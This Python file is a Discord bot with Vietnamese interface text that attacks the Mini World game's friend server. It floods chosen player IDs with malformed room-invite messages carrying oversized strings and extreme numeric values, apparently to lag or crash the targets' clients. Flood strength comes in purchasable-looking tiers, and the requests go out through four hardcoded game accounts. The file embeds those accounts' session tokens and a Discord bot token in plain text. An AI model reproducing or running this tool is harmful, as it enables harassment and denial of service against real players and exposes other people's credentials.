import requests
import asyncio
import base64
import json
import urllib.parse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import discord
from discord.ext import commands
from threading import Semaphore

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=".", intents=intents)
bot.remove_command('help')

url = "http://friend.miniworldgame.com:8180//server/friend"

TIERS = {
  1: {"name": "Cấp 1", "TOTAL_REQUESTS" :10 , "MAX_WORKERS" : 5 , "sleep_time": 15 , "requests_per_acc" : 15 , "description": "Spam nhẹ" , },
  2: {"name": "Cấp 2", "TOTAL_REQUESTS" :15 , "MAX_WORKERS" : 10 , "sleep_time": 14 , "requests_per_acc" : 20 , "description": "Spam trung bình"},
  3: {"name": "Cấp 3", "TOTAL_REQUESTS" :20 , "MAX_WORKERS" : 15 , "sleep_time": 13, "requests_per_acc" : 25 , "description": "Spam mạnh"},
  4: {"name": "Cấp 4", "TOTAL_REQUESTS" :100 , "MAX_WORKERS" : 30 , "sleep_time": 10, "requests_per_acc" : 50 , "description": "Spam cực mạnh"},
}

user_tiers = {}
admin_ids = ["1275674455728980031"]

# Lưu thời gian spam cuối cùng mỗi kênh
last_spam_time = {}

def load_user_tiers():
  global user_tiers
  try:
      with open("user_tiers.json", "r") as f:
          user_tiers = json.load(f)
  except:
      user_tiers = {}

def save_user_tiers():
  with open("user_tiers.json", "w") as f:
      json.dump(user_tiers, f)

load_user_tiers()

def get_user_current_tier(user_id):
  return int(user_tiers.get(str(user_id), 1))

def set_user_tier(user_id, tier):
  user_tiers[str(user_id)] = tier
  save_user_tiers()

base_message = "駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客"
layer1 = base64.b64encode(base_message.encode()).decode()
layer2 = base64.b64encode(layer1.encode()).decode()
encoded_message = urllib.parse.quote(layer2)
print("Độ dài msg:", len(encoded_message))

def create_extend_data(room_data):
    return base64.b64encode(json.dumps(room_data).encode()).decode()

room_data = {
    "GuestInCollaborationMode": False,
    "ErrorCode": True,
    "InviterName": "駭客駭客駭客駭客駭客駭客駭客駭客駭客駭",
    "Password": "迷你世",
    "PlayerMaxNum": 999999999999,
    "PlayerNum": 999999999999,
    "RoomName": "駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭",
    "RoomNum": 999999999999,
    "RoomType": 999999999999,
    "RoomUin": 999999999999,
    "RoomVer": 999999999999,
    "ServerID": 217632137,
    "ServerIP": 12362137,
    "ServerPort": 1236,
    "Standby1": -99999999,
    "Type": "InviteJoinRoom",
    "WorldID": -9999999999,
    "WorldType": 61231293,
    "WorldUin": 1146608460,
    "WorldVer": 999999999999,
    "WorldName": "駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭",
    "WorldDesc": 2321,
    "WorldIcon": 2321,
    "WorldType_": 2322131,
    "WorldUin_": 1146608460,
}

room_data_1 = {
    "GuestInCollaborationMode": False,
    "ErrorCode": True,
    "InviterName": "經理經理經理經理經理經理經理經理經理",
    "Password": "經理經",
    "PlayerMaxNum": 999999999999,
    "PlayerNum": 999999999999,
    "RoomName": "經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理經理",
    "RoomNum": 999999999999,
    "RoomType": 999999999999,
    "RoomUin": 999999999999,
    "RoomVer": 999999999999,
    "ServerID": 217632137,
    "ServerIP": 12362137,
    "ServerPort": 1236,
    "Standby1": -99999999,
    "Type": "InviteJoinRoom",
    "WorldID": -9999999999,
    "WorldType": 61231293,
    "WorldUin": 1146608460,
    "WorldVer": 999999999999,
    "WorldName": "駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭",
    "WorldDesc": 2321,
    "WorldIcon": 2321,
    "WorldType_": 2322131,
    "WorldUin_": 1146608460,
}

room_data_2 = {
    "GuestInCollaborationMode": False,
    "InviterName": "上帝上帝上帝上帝上帝上帝上帝上帝上帝",
    "Password": "上帝上",
    "PlayerMaxNum": 999999999999,
    "PlayerNum": 999999999999,
    "RoomName": "上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上帝上",
    "RoomNum": 999999999999,
    "RoomType": 999999999999,
    "RoomUin": 999999999999,
    "RoomVer": 999999999999,
    "ServerID": 217632137,
    "ServerIP": 12362137,
    "ServerPort": 1236,
    "Standby1": -99999999,
    "Type": "InviteJoinRoom",
    "WorldID": -9999999999,
    "WorldType": 61231293,
    "WorldUin": 1146608460,
    "WorldVer": 999999999999,
    "WorldName": "駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭",
    "WorldDesc": 2321,
    "WorldIcon": 2321,
    "WorldType_": 2322131,
    "WorldUin_": 1146608460,
}

room_data_3 = {
    "GuestInCollaborationMode": False,
    "InviterName": "聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖",
    "Password": "聖聖聖",
    "PlayerMaxNum": 999999999999,
    "PlayerNum": 999999999999,
    "RoomName": "聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖聖",
    "RoomNum": 999999999999,
    "RoomType": 999999999999,
    "RoomUin": 999999999999,
    "RoomVer": 999999999999,
    "ServerID": 217632137,
    "ServerIP": 12362137,
    "ServerPort": 1236,
    "Standby1": -99999999,
    "Type": "InviteJoinRoom",
    "WorldID": -9999999999,
    "WorldType": 61231293,
    "WorldUin": 1146608460,
    "WorldVer": 999999999999,
    "WorldName": "駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭客駭",
    "WorldDesc": 2321,
    "WorldIcon": 2321,
    "WorldType_": 2322131,
    "WorldUin_": 1146608460,
}

extend_data = create_extend_data(room_data)
extend_data_1 = create_extend_data(room_data_1)
extend_data_2 = create_extend_data(room_data_2)
extend_data_3 = create_extend_data(room_data_3)

accounts = [
    {
        "name": "Account 1",
        "params": {
            "apiid": "-999", "cmd": "send_chat_msg", "country": "VN", "des_uin": "",
            "extend_data": extend_data, "lang": "10", "msg": encoded_message,
            "show_type": "-999999999999", "src_uin": "1192548629", "ver": "1.2",
            "msgtype": "-9999999999999", "pushchannel": "-9999999999999",
            "s2t": "1750761079", "time": "1750761375", "uin": "1192548629",
            "token": "56e1270a431ba1a3abd4c7b18a7f1bf0",
            "auth": "aa432f85272d12df19a4a17933f300e6"
        }
    },
    {
        "name": "Account 2",
        "params": {
            "apiid": "-999", "cmd": "send_chat_msg", "country": "VN", "des_uin": "",
            "extend_data": extend_data_1, "lang": "10", "msg": encoded_message,
            "show_type": "-999999999999", "src_uin": "1309004346", "ver": "1.4",
            "msgtype": "-999999999999", "pushchannel": "-999999999999",
            "s2t": "1750761464", "time": "1750761555", "uin": "1309004346",
            "token": "6eeac136b1f49e688ee9e437bb949f0f",
            "auth": "db7064685c6a70254039711340c03adb"
        }
    },
    {
        "name": "Account 3",
        "params": {
            "apiid": "410", "cmd": "send_chat_msg", "country": "VN", "des_uin": "",
            "extend_data": extend_data_2, "lang": "10", "msg": encoded_message,
            "show_type": "1", "src_uin": "1309476734", "ver": "1.7.15",
            "msgtype": "3", "pushchannel": "1",
            "s2t": "1750761603", "time": "1750761675", "uin": "1309476734",
            "token": "8262d1b82e9949aade2dadba213eebcc",
            "auth": "9fdfd7a88d714fc17fb2e32e33397532"
        }
    },
    {
        "name": "Account 4",
        "params": {
            "apiid": "410", "cmd": "send_chat_msg", "country": "VN", "des_uin": "",
            "extend_data": extend_data_3, "lang": "10", "msg": encoded_message,
            "show_type": "1", "src_uin": "1309476903", "ver": "1.7.15",
            "msgtype": "3", "pushchannel": "1",
            "s2t": "1750761704", "time": "1750761793", "uin": "1309476903",
            "token": "a0d4d2212f9ff46c5f4cf2743472219f",
            "auth": "5888383eedf2a8c4b6af5c849913e8e9"
        }
    }
]

spam_tasks = {}
semaphore = Semaphore(TIERS[1]["MAX_WORKERS"])

def send_message(acc_name, acc_params, i, des_uin):
    with semaphore:
        params = acc_params.copy()
        params["des_uin"] = des_uin
        try:
            print(f"[{acc_name} #{i}] Sending message to {des_uin}...")
            requests.get(url, params=params, timeout=5)
        except Exception as e:
            print(f"[{acc_name} #{i}] Error sending to {des_uin}: {e}")

async def spam_loop(ctx, des_uins, tier):
    loop_count = 0
    tier_config = TIERS[tier]

    while ctx.channel.id in spam_tasks:
        loop_count += 1
        for des_uin in des_uins:
            if ctx.channel.id not in spam_tasks:
                break
            await ctx.send(f"🔁 Lượt {loop_count} → UID `{des_uin}`")
            with ThreadPoolExecutor(max_workers=tier_config["MAX_WORKERS"]) as executor:
                futures = [executor.submit(send_message, acc["name"], acc["params"].copy(), i, des_uin)
                           for acc in accounts for i in range(tier_config["requests_per_acc"])]

                for future in as_completed(futures):
                    if ctx.channel.id not in spam_tasks:
                        break 
            await asyncio.sleep(tier_config["sleep_time"])

@bot.command()
async def lagv2(ctx, tier: int = None, *, uids: str = None):
    user_id = str(ctx.author.id)
    current_tier = get_user_current_tier(user_id)

    if tier is None or uids is None:
        return await ctx.send("❌ Dùng `.lagv2 <cấp> <uid>`")

    if tier not in TIERS:
        return await ctx.send("❌ Cấp không hợp lệ!")

    if current_tier < tier:
        return await ctx.send(f"❌ Bạn chỉ được dùng cấp **≤ {current_tier}** - {TIERS[current_tier]['name']}")

    # Delay nếu có spam trước
    now = time.time()
    last_used = last_spam_time.get(ctx.channel.id, 0)
    if now - last_used < 5:
        wait_time = round(5 - (now - last_used), 1)
        return await ctx.send(f"⚠️ Vui lòng chờ {wait_time}s nữa trước khi tiếp tục!")

    if ctx.channel.id in spam_tasks:
        return await ctx.send("⚠️ Đang có spam! Dùng `.stop` trước.")

    des_uins = [uid.strip() for uid in uids.split(",") if uid.strip()]
    if not des_uins:
        return await ctx.send("❌ Không tìm thấy UID hợp lệ!")

    tier_config = TIERS[tier]
    global semaphore
    semaphore = Semaphore(tier_config["MAX_WORKERS"])
    spam_tasks[ctx.channel.id] = True
    last_spam_time[ctx.channel.id] = time.time()

    await ctx.send(f"🚀 Bắt đầu spam cấp {tier} - {tier_config['name']}")
    try:
        await spam_loop(ctx, des_uins, tier)
    finally:
        if ctx.channel.id in spam_tasks:
            del spam_tasks[ctx.channel.id]
        last_spam_time[ctx.channel.id] = time.time()
        await ctx.send("🛑 Đã dừng spam!")

@bot.command()
async def stop(ctx):
    if ctx.channel.id in spam_tasks:
        del spam_tasks[ctx.channel.id]
        await ctx.send("✅ Đã dừng spam!")
    else:
        await ctx.send("❌ Không có spam nào đang chạy.")

@bot.command()
async def mytier(ctx):
    tier = get_user_current_tier(ctx.author.id)
    await ctx.send(f"📊 Cấp hiện tại của bạn là: {tier} - {TIERS[tier]['name']}")

@bot.command()
async def tiers(ctx):
    embed = discord.Embed(title="📶 Danh sách cấp", color=0x00ff00)
    for i, t in TIERS.items():
        embed.add_field(name=f"{i}. {t['name']}", value=f"{t['description']}\n• {t['requests_per_acc']} Lời Mời/acc", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def setusertier(ctx, user_id: str = None, tier: int = None):
    if str(ctx.author.id) not in admin_ids:
        return await ctx.send("❌ Bạn không có quyền!")
    if user_id is None or tier is None or tier not in TIERS:
        return await ctx.send("❌ Dùng `.setusertier <uid> <cấp>`")
    set_user_tier(user_id, tier)
    await ctx.send(f"✅ Đặt user `{user_id}` thành cấp {tier} - {TIERS[tier]['name']}")

@bot.command()
async def clear(ctx, amount: int = 10):
    if str(ctx.author.id) not in admin_ids:
        return await ctx.send("❌ Bạn không có quyền!")
    await ctx.channel.purge(limit=amount)
    await ctx.send(f"🧹 Đã dọn {amount} tin nhắn!", delete_after=3)

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="📘 Lệnh Bot", color=0x3498db)
    embed.add_field(name=".lagv3 <cấp> <uid1,uid2,...>", value="Bắt đầu spam", inline=False)
    embed.add_field(name=".stop", value="Dừng spam", inline=False)
    embed.add_field(name=".mytier", value="Xem cấp hiện tại của bạn", inline=False)
    embed.add_field(name=".tiers", value="Xem thông tin các cấp", inline=False)
    embed.add_field(name=".setusertier <uid> <cấp>", value="(Admin)", inline=False)
    embed.add_field(name=".clear <số>", value="Xóa tin nhắn (Admin)", inline=False)
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    print(f"✅ Bot đã online: {bot.user}")

bot.run("MTM4OTA0MzQwMTkzMjAxNzcwNA.GiLKPd.5Wi8J6DnDYmlrWXr5kE7CC_vMKOdKwyXtrmiXQ")
